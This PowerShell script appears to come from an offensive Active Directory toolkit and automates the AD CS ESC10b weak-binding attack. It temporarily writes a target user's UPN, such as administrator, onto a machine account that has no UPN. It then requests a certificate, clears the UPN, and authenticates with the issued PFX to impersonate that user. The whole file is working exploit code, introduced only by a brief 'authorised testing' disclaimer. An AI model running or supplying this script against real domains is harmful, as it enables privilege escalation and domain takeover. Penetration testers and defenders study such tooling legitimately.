<#
.SYNOPSIS
    AD CS ESC10b - Weak Binding (Compatibility + No-UPN Account) (LOLBAS).
.DESCRIPTION
    Exploits StrongCertificateBindingEnforcement = 1 (compatibility mode)
    with a machine account that has no UPN. Sets the target UPN on the
    machine account, requests a cert, then clears it.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Enrollable certificate template
.PARAMETER MachineAccount
    Machine account sAMAccountName (without $) that has no UPN
.PARAMETER TargetUPN
    UPN of the user to impersonate
.EXAMPLE
    .\Invoke-ESC10b.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "Machine" -MachineAccount "WS01" -TargetUPN "administrator@zsec.red"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,
    [Parameter(Mandatory)] [string]$MachineAccount,
    [Parameter(Mandatory)] [string]$TargetUPN,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC10b Standalone" -ForegroundColor White
Write-Host "  ----------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC10b" "Weak Binding - Compatibility + No-UPN"

Write-Stage -Number 1 -Name "RECONNAISSANCE"
$account = Get-ADComputer -Identity $MachineAccount -Properties userPrincipalName -ErrorAction SilentlyContinue
if ($account.userPrincipalName) {
    Write-Host "    [-] $MachineAccount already has UPN: $($account.userPrincipalName)" -ForegroundColor Red
    Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'FAILED'; exit 1
}
Write-Host "    [+] $MachineAccount has no UPN (required for ESC10b)" -ForegroundColor Green
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

# STAGE 2: SET UPN
Write-Host ""
Write-Stage -Number 2 -Name "POSITIONING - Set UPN on Machine Account"
Write-Host "    [>] Setting $MachineAccount UPN to $TargetUPN" -ForegroundColor Yellow
Set-ADComputer -Identity $MachineAccount -Add @{userPrincipalName = $TargetUPN}
Start-Sleep -Seconds 2
Write-Stage -Number 2 -Name "POSITIONING" -Status 'COMPLETE'

# STAGE 3: REQUEST
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST"
$inf = New-CertRequestINF -Subject "CN=$MachineAccount" -Template $TemplateName `
    -OutFile "$OutputDir\esc10b.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc10b"

# IMMEDIATELY clear UPN
Write-Host "    [>] Clearing UPN from $MachineAccount" -ForegroundColor Yellow
Set-ADComputer -Identity $MachineAccount -Clear userPrincipalName
Write-Host "    [+] UPN cleared" -ForegroundColor Green

if (-not $result.Success) { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1 }
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
Write-Host "    [i] Compatibility mode: KDC falls back to UPN mapping for no-UPN accounts" -ForegroundColor Cyan
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
